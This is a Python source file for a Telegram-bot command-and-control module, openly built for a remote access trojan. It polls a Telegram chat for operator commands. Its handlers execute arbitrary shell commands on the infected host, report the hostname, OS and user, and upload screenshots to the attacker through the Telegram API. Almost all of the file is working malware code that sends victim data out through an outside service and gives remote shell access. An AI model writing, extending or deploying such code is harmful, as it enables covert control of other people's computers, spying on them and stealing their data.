# core/telegram_c2.py
import threading
import time
import subprocess
import os
import sys
import requests
import json
from typing import Callable, Optional

class TelegramC2:
    """Telegram bot based C2 channel"""
    def __init__(self, bot_token: str, chat_id: str):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.base_url = f"https://api.telegram.org/bot{bot_token}"
        self.last_update_id = 0
        self.running = False
        self.command_handlers = {}
        
    def send_message(self, text: str):
        """Send message to Telegram chat"""
        try:
            url = f"{self.base_url}/sendMessage"
            data = {"chat_id": self.chat_id, "text": text[:4096]}
            requests.post(url, json=data, timeout=10)
        except Exception as e:
            print(f"Telegram send error: {e}")
            
    def send_file(self, file_path: str, caption: str = ""):
        """Send file via Telegram"""
        try:
            url = f"{self.base_url}/sendDocument"
            with open(file_path, 'rb') as f:
                files = {'document': f}
                data = {'chat_id': self.chat_id, 'caption': caption}
                requests.post(url, files=files, data=data, timeout=30)
        except Exception as e:
            self.send_message(f"File send error: {e}")
            
    def get_updates(self):
        """Fetch new updates from Telegram"""
        try:
            url = f"{self.base_url}/getUpdates"
            params = {"offset": self.last_update_id + 1, "timeout": 30}
            response = requests.get(url, params=params, timeout=35)
            if response.status_code == 200:
                updates = response.json().get('result', [])
                for update in updates:
                    self.last_update_id = update['update_id']
                    message = update.get('message')
                    if message and 'text' in message:
                        chat_id = str(message['chat']['id'])
                        if chat_id == self.chat_id:
                            text = message['text']
                            self.process_command(text)
            return True
        except Exception as e:
            print(f"Get updates error: {e}")
            return False
            
    def process_command(self, cmd: str):
        """Process incoming command"""
        parts = cmd.strip().split(maxsplit=1)
        command = parts[0].lower()
        args = parts[1] if len(parts) > 1 else ''
        
        if command in self.command_handlers:
            self.command_handlers[command](args)
        else:
            self.send_message(f"Unknown command: {command}")
            
    def register_handler(self, command: str, handler: Callable):
        """Register a command handler"""
        self.command_handlers[command] = handler
        
    def start(self):
        """Start polling for commands"""
        self.running = True
        self.send_message("✅ Telegram C2 started")
        while self.running:
            try:
                self.get_updates()
                time.sleep(1)
            except KeyboardInterrupt:
                break
            except:
                time.sleep(5)
                
    def stop(self):
        """Stop polling"""
        self.running = False

def demo_handlers():
    """Example handlers for common RAT commands"""
    def handle_sysinfo(args):
        import platform
        import socket
        info = f"Host: {socket.gethostname()}\nOS: {platform.platform()}\nUser: {os.getlogin()}"
        c2.send_message(info)
        
    def handle_shell(args):
        if args:
            result = subprocess.run(args, shell=True, capture_output=True, text=True)
            output = result.stdout + result.stderr
            if len(output) > 4000:
                output = output[:4000] + "..."
            c2.send_message(output if output else "[No output]")
        else:
            c2.send_message("Usage: shell <command>")
            
    def handle_screenshot(args):
        try:
            from core.screenshot import take_screenshot
            b64_img = take_screenshot()
            if b64_img and b64_img != "Screenshot failed":
                import base64
                img_data = base64.b64decode(b64_img)
                with open("screenshot.png", "wb") as f:
                    f.write(img_data)
                c2.send_file("screenshot.png", "📸 Screenshot")
                os.remove("screenshot.png")
            else:
                c2.send_message("Screenshot failed")
        except Exception as e:
            c2.send_message(f"Screenshot error: {e}")
            
    c2 = None  # will be set externally
    return locals()

# Example usage: bot = TelegramC2("TOKEN", "CHAT_ID"); bot.register_handler("sysinfo", handle_sysinfo); bot.start()
